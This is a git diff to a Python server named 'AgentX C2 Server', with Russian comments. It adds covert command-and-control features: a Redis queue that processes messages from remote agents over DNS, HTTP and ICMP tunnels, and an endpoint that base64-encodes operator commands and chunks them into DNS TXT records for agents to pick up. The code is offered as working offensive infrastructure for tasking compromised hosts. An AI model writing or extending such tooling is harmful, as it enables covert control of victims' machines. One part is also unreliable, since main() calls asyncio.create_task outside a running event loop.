@@ -25,6 +25,8 @@ from datetime import datetime
 import uuid
 from web3 import Web3
 import redis
+import base64
+from pydantic import BaseModel
 
 # Настройка путей для корректной работы импортов
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -52,6 +54,12 @@ from src.autonomous_agent import AutonomousAgent
 # Импорт Celery app и задач
 from src.celery_app import celery_app, REDIS_URL
 from src.tasks import analyze_contract_task, PROCESSED_CONTRACTS_SET
+
+# --- Pydantic Models ---
+class AgentTask(BaseModel):
+    command: str
+    params: Optional[Dict[str, Any]] = {}
+    task_id: Optional[str] = None # Можно генерировать ID задачи
 
 # Настройка логирования
 log_format = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
@@ -108,6 +116,16 @@ try:
 except redis.exceptions.ConnectionError as e:
     logger.error(f"C2 Server failed to connect to Redis at {REDIS_URL}: {e}. Producer deduplication disabled.")
     producer_redis_client = None
+
+# Префиксы ключей Redis
+INCOMING_PREFIX = "dns:incoming:"
+OUTGOING_PREFIX = "dns:outgoing:"
+# Очередь необработанных сообщений от агентов для C2
+C2_INCOMING_QUEUE = "c2:incoming_messages"
+# Канал Pub/Sub для уведомления C2 о новых сообщениях
+C2_NOTIFICATION_CHANNEL = "c2:new_message_notify"
+# Максимальный размер чанка для TXT записи (чуть меньше 255 для безопасности)
+DNS_CHUNK_SIZE = 250
 
 # --- Block Monitoring Producer Logic ---
 async def _monitor_blocks_producer(chain: str, network: str, rpc_url: str, start_block: Union[str, int] = 'latest', poll_interval: int = 15):
@@ -207,6 +225,81 @@ async def _monitor_blocks_producer(chain: str, network: str, rpc_url: str, start
     finally:
          logger.info(f"Stopping block monitor producer for {monitor_id}")
 
+# --- C2 Incoming Message Processor ---
+async def _process_incoming_messages():
+    """Processes incoming messages from agents received via tunnels (e.g., DNS)"""
+    if not producer_redis_client: # Используем тот же клиент Redis
+        logger.error("Redis client not available. Cannot process incoming messages.")
+        return
+
+    logger.info("Запуск обработчика входящих сообщений от агентов...")
+    # Можно использовать BLPOP для блокирующего чтения или цикл с LPOP/sleep
+    # Используем цикл LPOP/sleep для простоты
+    while True:
+        try:
+            # Извлекаем одно сообщение из очереди
+            raw_message = producer_redis_client.lpop(C2_INCOMING_QUEUE)
+            
+            if raw_message:
+                logger.info(f"Получено новое сообщение из очереди C2: {raw_message[:100]}...")
+                try:
+                    message_data = json.loads(raw_message)
+                    session_id = message_data.get("session_id")
+                    agent_data_str = message_data.get("data")
+                    timestamp = message_data.get("timestamp")
+                    
+                    if session_id and agent_data_str:
+                        logger.info(f"Сообщение от сессии {session_id}: {agent_data_str}")
+                        # Ищем агента по session_id
+                        found_agent_id = None
+                        for agent_id, agent_info in agents.items():
+                            # Проверяем все типы сессий на всякий случай
+                            if agent_info.get("dns_session_id") == session_id or \
+                               agent_info.get("http_session_id") == session_id or \
+                               agent_info.get("icmp_session_id") == session_id:
+                                found_agent_id = agent_id
+                                break
+                                
+                        if found_agent_id:
+                             logger.info(f"Сообщение от агента {found_agent_id}")
+                             # Обновляем last_seen
+                             agents[found_agent_id]["last_seen"] = datetime.now().isoformat()
+                             # TODO: Обработать данные от агента (например, результат выполнения команды)
+                             # Пока просто сохраняем последние данные
+                             agents[found_agent_id]["last_data"] = agent_data_str
+                             agents[found_agent_id]["last_data_timestamp"] = timestamp
+                             # Пример: если данные - это результат задачи, обновить статус операции
+                             # try:
+                             #    result_data = json.loads(agent_data_str)
+                             #    if "task_id" in result_data and result_data["task_id"] in operations:
+                             #        operations[result_data["task_id"]]["status"] = "completed" # или failed
+                             #        operations[result_data["task_id"]]["results"] = result_data.get("result")
+                             # except:
+                             #    pass # Не JSON или нет task_id
+                        else:
+                             logger.warning(f"Не найден агент для сессии {session_id}")
+                    else:
+                        logger.warning(f"Некорректный формат сообщения в очереди C2: {raw_message}")
+                
+                except json.JSONDecodeError:
+                    logger.error(f"Ошибка декодирования JSON из очереди C2: {raw_message}")
+                except Exception as e:
+                     logger.error(f"Ошибка обработки сообщения из очереди C2: {e}", exc_info=True)
+            
+            else:
+                # Очередь пуста, ждем немного
+                await asyncio.sleep(5) # Пауза 5 секунд
+
+        except redis.exceptions.ConnectionError as e:
+            logger.error(f"Ошибка соединения с Redis в обработчике сообщений: {e}. Повторная попытка через 30с.")
+            await asyncio.sleep(30)
+        except asyncio.CancelledError:
+            logger.info("Обработчик входящих сообщений остановлен.")
+            break
+        except Exception as e:
+            logger.error(f"Критическая ошибка в обработчике сообщений: {e}", exc_info=True)
+            await asyncio.sleep(60) # Пауза перед повторной попыткой
+
 @app.get("/")
 async def root():
     return {"status": "online", "name": "AgentX C2", "version": "1.0.0"}
@@ -230,11 +323,21 @@ async def get_agents():
 @app.post("/api/agents/register")
 async def register_agent(agent_data: Dict[str, Any]):
     agent_id = str(uuid.uuid4())
-    agent_data["id"] = agent_id
-    agent_data["registered_at"] = datetime.now().isoformat()
-    agent_data["last_seen"] = datetime.now().isoformat()
-    agents[agent_id] = agent_data
-    logger.info(f"New agent registered: {agent_id}")
+    agent_info = {
+        "id": agent_id,
+        "registered_at": datetime.now().isoformat(),
+        "last_seen": datetime.now().isoformat(),
+        # Сохраняем исходные данные, переданные агентом
+        "initial_data": agent_data,
+        # Извлекаем и сохраняем ID сессий для разных туннелей (если переданы)
+        "dns_session_id": agent_data.get("dns_session_id"), 
+        "http_session_id": agent_data.get("http_session_id"),
+        "icmp_session_id": agent_data.get("icmp_session_id"),
+        "preferred_channel": agent_data.get("preferred_channel", "https") # Канал для check-in
+    }
+    
+    agents[agent_id] = agent_info
+    logger.info(f"New agent registered: {agent_id} (DNS: {agent_info['dns_session_id']}) ")
     return {"agent_id": agent_id, "status": "registered"}
 
 @app.get("/api/exploits")
@@ -796,6 +899,67 @@ async def shutdown_event():
             logger.info(f"Cancelled monitor task {monitor_id}")
     logger.info("All active monitors cancelled.")
 
+    # Останавливаем обработчик входящих сообщений
+    if hasattr(app.state, 'incoming_message_task') and app.state.incoming_message_task:
+         app.state.incoming_message_task.cancel()
+
+    logger.info("Завершение работы сервера...")
+
+@app.post("/api/agents/{agent_id}/tasks")
+async def assign_task_to_agent(agent_id: str, task: AgentTask):
+    """Assigns a task to a specific agent via their communication channel."""
+    if agent_id not in agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    
+    agent_info = agents[agent_id]
+    # TODO: Реальный механизм определения активного туннеля и session_id
+    # Теперь можем получить dns_session_id из agent_info
+    dns_session_id = agent_info.get("dns_session_id") # Нужно добавить это поле при регистрации!
+    
+    if not dns_session_id:
+        raise HTTPException(status_code=400, detail="Agent does not have an active DNS tunnel session configured")
+
+    if not producer_redis_client:
+         raise HTTPException(status_code=503, detail="Redis service unavailable, cannot queue task")
+
+    # Генерируем ID задачи, если не предоставлен
+    if not task.task_id:
+        task.task_id = str(uuid.uuid4())
+        
+    # Формируем команду для отправки (например, JSON)
+    command_payload = json.dumps({
+        "task_id": task.task_id,
+        "command": task.command,
+        "params": task.params
+    })
+    
+    # Кодируем в base64
+    encoded_command = base64.b64encode(command_payload.encode()).decode('ascii')
+    
+    # Разбиваем на чанки для DNS TXT
+    chunks = [encoded_command[i:i+DNS_CHUNK_SIZE] 
+              for i in range(0, len(encoded_command), DNS_CHUNK_SIZE)]
+              
+    if not chunks:
+         raise HTTPException(status_code=400, detail="Cannot send empty command")
+
+    # Записываем чанки в очередь Redis для DNS сервера
+    redis_key = f"{OUTGOING_PREFIX}{dns_session_id}"
+    try:
+        # Используем RPUSH чтобы добавить все чанки в конец списка
+        # DNS сервер будет использовать LPOP чтобы забирать по одному
+        producer_redis_client.rpush(redis_key, *chunks)
+        # Устанавливаем TTL, чтобы очередь не жила вечно, если агент не заберет
+        producer_redis_client.expire(redis_key, 60) # 1 минута
+        logger.info(f"Task {task.task_id} ({task.command}) queued for agent {agent_id} (DNS session {dns_session_id}) in {len(chunks)} chunks.")
+    except redis.exceptions.RedisError as e:
+        logger.error(f"Redis error queueing task for agent {agent_id}: {e}")
+        raise HTTPException(status_code=500, detail="Failed to queue task due to Redis error")
+
+    # TODO: Сохранить информацию о поставленной задаче где-то в C2
+    
+    return {"status": "task_queued", "task_id": task.task_id, "agent_id": agent_id, "chunks": len(chunks)}
+
 def main():
     """Основная функция для запуска сервера"""
     parser = argparse.ArgumentParser(description="AgentX C2 Server")
@@ -805,6 +969,16 @@ def main():
     
     logger.info(f"Starting AgentX C2 Server on {args.host}:{args.port}")
     
+    # Запуск фоновых задач
+    # Пример: Запуск мониторинга Ethereum по умолчанию (если нужно)
+    # asyncio.create_task(_monitor_blocks_producer('ethereum', 'mainnet', os.getenv("ETH_MAINNET_RPC", ""))) 
+    
+    # Запуск обработчика входящих сообщений
+    incoming_task = asyncio.create_task(_process_incoming_messages())
+    # Сохраняем ссылку на задачу, чтобы можно было остановить при shutdown
+    app.state.incoming_message_task = incoming_task
+    
+    # Запуск uvicorn сервера
     uvicorn.run(app, host=args.host, port=args.port)
 
 if __name__ == "__main__":
